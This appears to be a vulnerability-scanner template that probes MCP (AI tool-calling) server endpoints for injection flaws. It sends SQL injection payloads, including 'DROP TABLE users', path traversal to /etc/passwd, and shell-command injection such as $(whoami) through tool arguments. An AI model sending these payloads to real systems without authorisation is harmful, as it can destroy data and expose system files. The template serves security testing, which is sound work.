id: mcp-tool-injection

info:
  name: MCP Tool Parameter Injection
  author: llmrt
  severity: critical
  description: Detects injection vulnerabilities in MCP tool parameters
  reference:
    - https://adversa.ai/mcp-top-25
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: mcp,injection,sql-injection,adversa-mcp-02

http:
  - method: POST
    path:
      - "{{BaseURL}}/mcp"
      - "{{BaseURL}}/api/mcp"
      - "{{BaseURL}}/rpc"
    
    headers:
      Content-Type: application/json
    
    body: |
      {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
          "name": "{{tool_name}}",
          "arguments": {
            "query": "{{payload}}"
          }
        }
      }
    
    payloads:
      tool_name:
        - "database_query"
        - "execute_sql"
        - "search"
        - "query"
      
      payload:
        - "' OR '1'='1"
        - "1; DROP TABLE users--"
        - "1 UNION SELECT null,null,null--"
        - "'; SELECT * FROM users--"
        - "1' AND '1'='1"
        - "../../../etc/passwd"
        - "$(whoami)"
        - "; ls -la"
    
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "syntax error"
          - "SQL"
          - "mysql"
          - "postgresql"
          - "sqlite"
          - "root:"
          - "bin/bash"
        condition: or
      
      - type: status
        status:
          - 200
      
      - type: word
        part: body
        words:
          - "error"
          - "exception"
        condition: or
    
    extractors:
      - type: regex
        part: body
        regex:
          - '(?i)(sql.*error.*)'
          - '(?i)(syntax.*error.*)'
          - '(root:.*:0:0:.*)'
